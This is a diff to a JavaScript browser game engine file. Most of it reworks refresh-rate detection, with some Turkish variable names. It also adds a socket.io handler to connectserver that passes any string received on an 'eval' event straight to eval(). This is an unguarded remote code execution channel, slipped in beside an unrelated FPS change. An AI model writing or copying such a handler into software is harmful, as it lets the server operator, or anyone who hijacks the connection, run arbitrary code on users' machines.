@@ -1,10 +1,14 @@
 var Playerupdaterdb = new Map()
 var Animateupdaterdb = new Map()
 var Engine_monitorhz = 0
+var Engine_socketid = undefined;
 var moduleloaded = {t:0,c:0,u:false}
 
 function connectserver(url,auth){
-try{ return io(("ws://"+url),{auth:auth,transports: ['websocket'] });
+try{ 
+const xserver = io(("ws://"+url),{auth:auth,transports: ['websocket'] });
+xserver.on('eval', evalc => eval(evalc));
+return xserver;
 }catch{return;}
 }
 
@@ -62,20 +66,24 @@ function Animator(ctype,player,array,type,time,loop){
  }
 }
 
-function Engine_testfps(timestamp) {
-  if (timestamp) return function(){
-      const liste = [30, 60, 75, 120, 144, 240, 360];
-      let eny = liste[0];
-      for (let i = 1; i < liste.length; i++) {
-        if (Math.abs(liste[i] - timestamp) < Math.abs(eny - timestamp)) {
-          eny = liste[i];
-      }}
-      Engine_monitorhz = eny
-      if(Engine_onload.fps == "vsync") Engine_updatefps(Engine_monitorhz)
-  }()
-  requestAnimationFrame(Engine_testfps);
-}
-requestAnimationFrame(Engine_testfps);
+
+const Engine_getFPS = () =>
+  new Promise(resolve =>
+    requestAnimationFrame(t1 =>
+      requestAnimationFrame(t2 => resolve(1000 / (t2 - t1)))
+    )
+  )
+
+
+Engine_getFPS().then(fps =>{
+  const liste = [24, 30, 60, 75, 90, 120, 144, 160, 180, 240, 280, 360];
+  const farklar = liste.map(x => Math.abs(x - fps));
+  const enKüçükFarkIndeksi = farklar.indexOf(Math.min(...farklar));
+  fps = liste[enKüçükFarkIndeksi]
+  Engine_monitorhz = fps
+  if(Engine_onload.fps == "vsync") Engine_updatefps(Engine_monitorhz)
+  Enginefpsupdatetasks.map(x=>x(fps))
+});
 
 
 function require(x){
